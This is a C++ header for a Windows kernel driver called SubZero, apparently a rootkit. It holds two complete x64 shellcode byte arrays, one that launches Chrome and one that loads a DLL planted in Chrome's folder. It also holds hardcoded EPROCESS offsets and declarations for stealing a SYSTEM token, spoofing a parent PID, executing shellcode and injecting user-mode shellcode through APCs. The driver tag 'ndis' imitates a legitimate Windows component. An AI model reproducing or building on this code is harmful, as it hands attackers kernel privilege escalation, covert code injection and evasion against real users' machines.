#pragma once
#include "pch.h"
#include "SubZeroCommon.h"
#include "UndocumentedImports.h"
#include <minwindef.h>

#define DRIVER_PREFIX DRIVER_NAME ": "
#define DRIVER_TAG 'ndis'
#define PARENT_PROCESS_NAME "explorer.exe"

// CreateHandleInformation.DesiredAccess terminate access
constexpr USHORT PROCESS_TERMINATE = 1;

// EPROCESS offsets
constexpr USHORT EPROCESS_PARENT_PID = 0x3e8;
constexpr USHORT EPROCESS_IMAGE_FILE_NAME = 0x450;
constexpr USHORT EPROCESS_ACTIVE_THREADS = 0x498;
constexpr USHORT EPROCESS_ACTIVE_PROCESS_LIST = 0x2F0;
 
//unsigned char LaunchChromeShellcode[] = "\x48\x89\xE0\x48\x81\xE4\x00\xFF\xFF\xFF\x48\x83\xC4\x08\x50\xE8\x00\x00\x00\x00\x41\x5F\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48\x31\xC9\x41\xB9\x19\x2E\xB5\xAE\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8\x51\x48\x89\xC1\xBA\x01\x00\x00\x00\xE8\x71\x00\x00\x00\x59\x44\x39\xC8\x75\xE0\x48\x31\xF6\x41\x8B\x70\x24\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48\x01\xDA\x48\x89\xD7\x48\x31\xD2\x48\x31\xC9\x48\xFF\xC1\x52\x48\x83\xF9\x0D\x75\xF6\x49\x89\xE2\x48\x31\xC9\x48\xFF\xC1\x52\x48\x83\xF9\x03\x75\xF6\x49\x89\xE3\x41\x53\x41\x52\x52\x52\x52\x52\x4D\x31\xC9\x4D\x31\xC0\x49\x8D\x8F\xF2\x00\x00\x00\x48\x83\xEC\x20\xFF\xD7\x48\x81\xC4\xD0\x00\x00\x00\xEB\x5C\x53\x57\xB8\x05\x15\x00\x00\x80\x39\x00\x74\x12\x89\xC3\xC1\xE0\x05\x01\xD8\x48\x0F\xB6\x39\x01\xF8\x48\x01\xD1\xEB\xE9\x5F\x5B\xC3\x43\x3A\x5C\x5C\x50\x72\x6F\x67\x72\x61\x6D\x20\x46\x69\x6C\x65\x73\x5C\x5C\x47\x6F\x6F\x67\x6C\x65\x5C\x5C\x43\x68\x72\x6F\x6D\x65\x5C\x5C\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x5C\x5C\x63\x68\x72\x6F\x6D\x65\x2E\x65\x78\x65\x00\x5C\xC3";
//unsigned char LoadLibraryShellcode[] = "\x48\x89\xE0\x48\x81\xE4\x00\xFF\xFF\xFF\x48\x83\xC4\x08\x50\xE8\x00\x00\x00\x00\x41\x5F\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48\x31\xC9\x41\xB9\xFB\xF0\xBF\x5F\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8\x51\x48\x89\xC1\xBA\x01\x00\x00\x00\xE8\x3D\x00\x00\x00\x59\x44\x39\xC8\x75\xE0\x48\x31\xF6\x41\x8B\x70\x24\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48\x01\xDA\x48\x89\xD7\x48\x83\xEC\x30\x49\x8D\x8F\xBE\x00\x00\x00\xFF\xD7\x48\x83\xC4\x30\xEB\x67\x53\x57\xB8\x05\x15\x00\x00\x80\x39\x00\x74\x12\x89\xC3\xC1\xE0\x05\x01\xD8\x48\x0F\xB6\x39\x01\xF8\x48\x01\xD1\xEB\xE9\x5F\x5B\xC3\x43\x3A\x5C\x5C\x50\x72\x6F\x67\x72\x61\x6D\x20\x46\x69\x6C\x65\x73\x5C\x5C\x47\x6F\x6F\x67\x6C\x65\x5C\x5C\x43\x68\x72\x6F\x6D\x65\x5C\x5C\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x5C\x5C\x65\x76\x65\x6E\x74\x6C\x6F\x67\x5F\x70\x72\x6F\x76\x69\x64\x65\x72\x2E\x64\x6C\x6C\x00\x5C\xC3";

constexpr UCHAR LaunchChromeShellcode[323] = {
	0x48, 0x89, 0xE0, 0x48, 0x81, 0xE4, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x08, 0x50, 0xE8,
	0x00, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B,
	0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 0x96, 0x48, 0xAD, 0x48, 0x8B, 0x58, 0x20,
	0x4D, 0x31, 0xC0, 0x44, 0x8B, 0x43, 0x3C, 0x4C, 0x89, 0xC2, 0x48, 0x01, 0xDA, 0x44, 0x8B, 0x82,
	0x88, 0x00, 0x00, 0x00, 0x49, 0x01, 0xD8, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x20, 0x48, 0x01,
	0xDE, 0x48, 0x31, 0xC9, 0x41, 0xB9, 0x19, 0x2E, 0xB5, 0xAE, 0x48, 0xFF, 0xC1, 0x48, 0x31, 0xC0,
	0x8B, 0x04, 0x8E, 0x48, 0x01, 0xD8, 0x51, 0x48, 0x89, 0xC1, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8,
	0x71, 0x00, 0x00, 0x00, 0x59, 0x44, 0x39, 0xC8, 0x75, 0xE0, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70,
	0x24, 0x48, 0x01, 0xDE, 0x66, 0x8B, 0x0C, 0x4E, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x1C, 0x48,
	0x01, 0xDE, 0x48, 0x31, 0xD2, 0x8B, 0x14, 0x8E, 0x48, 0x01, 0xDA, 0x48, 0x89, 0xD7, 0x48, 0x31,
	0xD2, 0x48, 0x31, 0xC9, 0x48, 0xFF, 0xC1, 0x52, 0x48, 0x83, 0xF9, 0x0D, 0x75, 0xF6, 0x49, 0x89,
	0xE2, 0x48, 0x31, 0xC9, 0x48, 0xFF, 0xC1, 0x52, 0x48, 0x83, 0xF9, 0x03, 0x75, 0xF6, 0x49, 0x89,
	0xE3, 0x41, 0x53, 0x41, 0x52, 0x52, 0x52, 0x52, 0x52, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xC0, 0x49,
	0x8D, 0x8F, 0xF2, 0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0xD7, 0x48, 0x81, 0xC4, 0xD0,
	0x00, 0x00, 0x00, 0xEB, 0x5C, 0x53, 0x57, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x80, 0x39, 0x00, 0x74,
	0x12, 0x89, 0xC3, 0xC1, 0xE0, 0x05, 0x01, 0xD8, 0x48, 0x0F, 0xB6, 0x39, 0x01, 0xF8, 0x48, 0x01,
	0xD1, 0xEB, 0xE9, 0x5F, 0x5B, 0xC3, 0x43, 0x3A, 0x5C, 0x5C, 0x50, 0x72, 0x6F, 0x67, 0x72, 0x61,
	0x6D, 0x20, 0x46, 0x69, 0x6C, 0x65, 0x73, 0x5C, 0x5C, 0x47, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x5C,
	0x5C, 0x43, 0x68, 0x72, 0x6F, 0x6D, 0x65, 0x5C, 0x5C, 0x41, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61,
	0x74, 0x69, 0x6F, 0x6E, 0x5C, 0x5C, 0x63, 0x68, 0x72, 0x6F, 0x6D, 0x65, 0x2E, 0x65, 0x78, 0x65,
	0x00, 0x5C, 0xC3
};

constexpr UCHAR LoadLibraryShellcode[282] = {
	0x48, 0x89, 0xE0, 0x48, 0x81, 0xE4, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x08, 0x50, 0xE8,
	0x00, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B,
	0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 0x96, 0x48, 0xAD, 0x48, 0x8B, 0x58, 0x20,
	0x4D, 0x31, 0xC0, 0x44, 0x8B, 0x43, 0x3C, 0x4C, 0x89, 0xC2, 0x48, 0x01, 0xDA, 0x44, 0x8B, 0x82,
	0x88, 0x00, 0x00, 0x00, 0x49, 0x01, 0xD8, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x20, 0x48, 0x01,
	0xDE, 0x48, 0x31, 0xC9, 0x41, 0xB9, 0xFB, 0xF0, 0xBF, 0x5F, 0x48, 0xFF, 0xC1, 0x48, 0x31, 0xC0,
	0x8B, 0x04, 0x8E, 0x48, 0x01, 0xD8, 0x51, 0x48, 0x89, 0xC1, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8,
	0x3D, 0x00, 0x00, 0x00, 0x59, 0x44, 0x39, 0xC8, 0x75, 0xE0, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70,
	0x24, 0x48, 0x01, 0xDE, 0x66, 0x8B, 0x0C, 0x4E, 0x48, 0x31, 0xF6, 0x41, 0x8B, 0x70, 0x1C, 0x48,
	0x01, 0xDE, 0x48, 0x31, 0xD2, 0x8B, 0x14, 0x8E, 0x48, 0x01, 0xDA, 0x48, 0x89, 0xD7, 0x48, 0x83,
	0xEC, 0x30, 0x49, 0x8D, 0x8F, 0xBE, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0xEB,
	0x67, 0x53, 0x57, 0xB8, 0x05, 0x15, 0x00, 0x00, 0x80, 0x39, 0x00, 0x74, 0x12, 0x89, 0xC3, 0xC1,
	0xE0, 0x05, 0x01, 0xD8, 0x48, 0x0F, 0xB6, 0x39, 0x01, 0xF8, 0x48, 0x01, 0xD1, 0xEB, 0xE9, 0x5F,
	0x5B, 0xC3, 0x43, 0x3A, 0x5C, 0x5C, 0x50, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x46, 0x69,
	0x6C, 0x65, 0x73, 0x5C, 0x5C, 0x47, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x5C, 0x5C, 0x43, 0x68, 0x72,
	0x6F, 0x6D, 0x65, 0x5C, 0x5C, 0x41, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E,
	0x5C, 0x5C, 0x65, 0x76, 0x65, 0x6E, 0x74, 0x6C, 0x6F, 0x67, 0x5F, 0x70, 0x72, 0x6F, 0x76, 0x69,
	0x64, 0x65, 0x72, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x5C, 0xC3
};

struct PisParameters
{
	LPVOID MmGetSystemRoutineAddress;
	LPVOID ReturnedDataAddress;
	USHORT ReturnedDataMaxSize;
};

typedef void (__stdcall * PicFunction)(PVOID StartContext);

struct Globals {
	ULONG ChromePID = 0;
	ULONG ExplorerPID = 0;
	ULONG ExplorerLauncherThreadID = 0;
	ULONG ChromeFirstThreadID = 0;
	EX_RUNDOWN_REF RundownProtection= {0 };
	PVOID ObjectRegistrationHandle = nullptr;
	LARGE_INTEGER RegistryRegistrationCookie = { 0 };
};

Globals g_Globals;

// Dispatch functions
DRIVER_UNLOAD SubZeroUnload;
DRIVER_DISPATCH SubZeroCreateClose;
DRIVER_DISPATCH SubZeroDeviceControl;

// Control code handlers
NTSTATUS SetParentPID_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation);
NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation);
NTSTATUS ExecuteShellcode_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation);

// Notification functions
NTSTATUS OnRegistryNotify(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);

// APC functions
NTSTATUS QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction);
void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize);

// Process util functions
NTSTATUS FindProcessByName(PCHAR ProcessName, PEPROCESS* Process);
NTSTATUS SetTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token);
